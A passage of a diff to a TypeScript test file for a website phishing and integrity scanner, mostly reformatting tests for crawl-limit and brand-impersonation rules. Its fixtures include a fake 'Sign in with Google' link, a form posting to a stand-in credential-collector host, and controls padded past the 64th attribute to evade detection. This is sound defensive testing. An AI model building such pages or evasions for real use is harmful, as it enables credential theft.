+    const row = await probe(pThemed, foreign(), { themedPages: 9 });
     expect(row?.escalated).toBe(true);
   });
 
   test("a crawl that stopped short of its limit is not capped", async () => {
-    const row = (await probe(pThemed, foreign(), {
+    const row = await probe(pThemed, foreign(), {
       themedPages: 9,
       crawlLimits: { pagesCrawled: 10, maxPages: 500 },
-    }));
+    });
     expect(row?.escalated).toBe(true);
   });
 
   test("a capped crawl with a baseline at the minimum escalates", async () => {
-    const row = (await probe(pThemed, foreign(), {
+    const row = await probe(pThemed, foreign(), {
       themedPages: 19,
       crawlLimits: { pagesCrawled: 20, maxPages: 20 },
-    }));
+    });
     expect(row?.escalated).toBe(true);
   });
 
   test("the minimum is an option, so a caller can lower it", async () => {
     const pages = [
-      ...Array.from({ length: 9 }, (_, i) => pageEntry(`${PSITE}/p${i}`, pThemed(`Page ${i}`))),
+      ...Array.from({ length: 9 }, (_, i) =>
+        pageEntry(`${PSITE}/p${i}`, pThemed(`Page ${i}`))
+      ),
       pageEntry(`${PSITE}/odd`, foreign()),
     ];
-    const checks = (await run(
+    const checks = await run(
       templateDiscontinuityRule,
       siteCtx(pages, {
         crawlLimits: { pagesCrawled: 10, maxPages: 10 },
         options: { minBaselinePagesWhenCapped: 5 },
       })
-    ));
+    );
     expect(find(checks, "template-discontinuity")?.status).toBe("warn");
   });
 
@@ -1360,34 +1471,57 @@ describe("integrity/template-discontinuity: capped crawls", () => {
   });
 });
 
-
 // ── Attributes past the 64th are still read (#1462): padding a control with junk attributes is not a way past the rules ─────────
 
 describe("a credential control with its attributes pushed past the 64th", () => {
-  const junk = (n: number) => Array.from({ length: n }, (_, i) => `d${i}="v"`).join(" ");
+  const junk = (n: number) =>
+    Array.from({ length: n }, (_, i) => `d${i}="v"`).join(" ");
   const kitWith = (link: string) =>
-    kitPageHtml().replace('<a href="https://accounts-google.tk/oauth">Sign in with Google</a>', link);
+    kitPageHtml().replace(
+      '<a href="https://accounts-google.tk/oauth">Sign in with Google</a>',
+      link
+    );
 
   test("the kit page stays a fail with the credential link's href at the 64th, 65th, 101st and 4,000th attribute", async () => {
     for (const n of [63, 64, 65, 101, 4_000]) {
-      const html = kitWith(`<a ${junk(n)} href="https://accounts-google.tk/oauth">Sign in with Google</a>`);
-      const brand = finding(await run(brandImpersonationRule, pageCtx(`${SITE}/calendly`, html)), "brand-impersonation");
-      expect([n, brand?.status, brand?.details?.escalated]).toEqual([n, "fail", true]);
-      const obf = finding(await run(obfuscatedScriptRule, pageCtx(`${SITE}/calendly`, html)), "obfuscated-script");
+      const html = kitWith(
+        `<a ${junk(n)} href="https://accounts-google.tk/oauth">Sign in with Google</a>`
+      );
+      const brand = finding(
+        await run(brandImpersonationRule, pageCtx(`${SITE}/calendly`, html)),
+        "brand-impersonation"
+      );
+      expect([n, brand?.status, brand?.details?.escalated]).toEqual([
+        n,
+        "fail",
+        true,
+      ]);
+      const obf = finding(
+        await run(obfuscatedScriptRule, pageCtx(`${SITE}/calendly`, html)),
+        "obfuscated-script"
+      );
       expect([n, obf?.status]).toEqual([n, "fail"]);
     }
   });
 
   test("an off-site link labelled only by an aria-label at the 70th attribute is a finding", () => {
     const html = `<!doctype html><html><head><title>Fixture</title></head><body><main><a href="https://accounts-google.tk/oauth" ${junk(69)} aria-label="Sign in with Google"><svg></svg></a></main></body></html>`;
-    expect(detectBrandImpersonation(pageCtx(`${SITE}/x`, html))?.brand).toBe("Google");
+    expect(detectBrandImpersonation(pageCtx(`${SITE}/x`, html))?.brand).toBe(
+      "Google"
+    );
   });
 
   test("an input submit with its value, and an input image with its alt, past the 64th attribute in an off-site form", () => {
     const form = (input: string) =>
       `<!doctype html><html><head><title>Fixture</title></head><body><main><form action="https://evil-collector.tk/grab" method="post">${input}</form></main></body></html>`;
-    for (const input of [`<input type="submit" ${junk(70)} value="Sign in with Google">`, `<input type="image" ${junk(70)} alt="Sign in with Google" src="/g.png">`]) {
-      expect([input.slice(0, 30), detectBrandImpersonation(pageCtx(`${SITE}/x`, form(input)))?.brand]).toEqual([input.slice(0, 30), "Google"]);
+    for (const input of [
+      `<input type="submit" ${junk(70)} value="Sign in with Google">`,
+      `<input type="image" ${junk(70)} alt="Sign in with Google" src="/g.png">`,
+    ]) {
+      expect([
+        input.slice(0, 30),
+        detectBrandImpersonation(pageCtx(`${SITE}/x`, form(input)))?.brand,
+      ]).toEqual([input.slice(0, 30), "Google"]);
     }
   });
 });
